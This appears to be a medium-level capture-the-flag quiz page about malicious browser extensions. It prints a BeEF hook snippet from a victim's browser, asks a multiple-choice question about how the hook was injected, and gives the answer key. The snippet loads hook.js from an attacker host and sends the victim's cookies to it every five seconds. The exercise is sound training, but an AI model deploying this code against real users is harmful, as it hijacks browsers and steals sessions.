![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Medium CTF - BeEF Hooked Session

During an incident investigation, a memory dump from a victim's browser reveals the following JavaScript snippet running inside an active tab:

```javascript
(function() {
    var beefUrl = "http://192.168.1.105:3000/hook.js";
    var s = document.createElement("script");
    s.src = beefUrl;
    document.head.appendChild(s);

    setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://192.168.1.105:3000/cmd?sid=" + btoa(document.cookie), true);
        xhr.send();
    }, 5000);
})();
```

The victim's browser has no unusual extensions installed, but a coworker's machine — which had a malicious extension — accessed the same internal web application 20 minutes earlier.

---

## Question

Based on the script and the timeline, what most likely happened?

---

## Flags (Choose One)

- **A)** The victim downloaded a malicious file that injected the script
- **B)** The BeEF hook was delivered via a drive-by download on an external website
- **C)** The coworker's extension modified the internal web application's response to inject the BeEF hook, which then ran in the victim's browser when they visited the same page
- **D)** The victim's browser auto-updated and shipped a compromised version of the JavaScript engine

---

Correct Flag: **C**

---

# Finished?
[Next Question](MBP_hard.md)

[Back to Card's Main Page](../Malicious_Browser_Plugins.md)
